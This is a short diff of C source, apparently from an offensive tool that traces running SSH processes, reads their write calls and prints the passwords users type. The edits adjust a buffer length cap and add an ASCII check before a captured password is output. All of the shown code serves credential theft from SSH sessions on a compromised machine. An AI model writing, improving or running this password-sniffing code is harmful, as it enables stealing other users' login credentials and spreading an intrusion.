@@ -52,9 +52,9 @@ char *find_password_write(char *memory, unsigned long len) {
   unsigned int checksum = 0;
   size_t slen = 0;
 
-
-  if (len > MAX_SYSCALL_READ)
-    len = MAX_SYSCALL_READ;
+  //Checked earlier, but just in case someone else uses this function later
+  if (len > MAX_PASSWORD_LEN)
+    len = MAX_PASSWORD_LEN;
 
   memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);
 
@@ -148,12 +148,13 @@ void intercept_ssh(pid_t traced_process) {
 
       //OPTIMIZATION NOTE: This check speeds things up, feel free to remove the if here
       //change MAX_PASSWORD_LEN in the config.h file to read larger passwords
-      if (length <= 0 || length > MAX_PASSWORD_LEN) continue;
+      if (length <= 0 || length > MAX_PASSWORD_LEN)
+        continue;
 
       write_string = extract_write_string(traced_process, length);
       password = find_password_write(write_string, length);
 
-      if (password)
+      if (password && strnascii(password, length))
         output("%s\n", password);
 
       free(write_string);
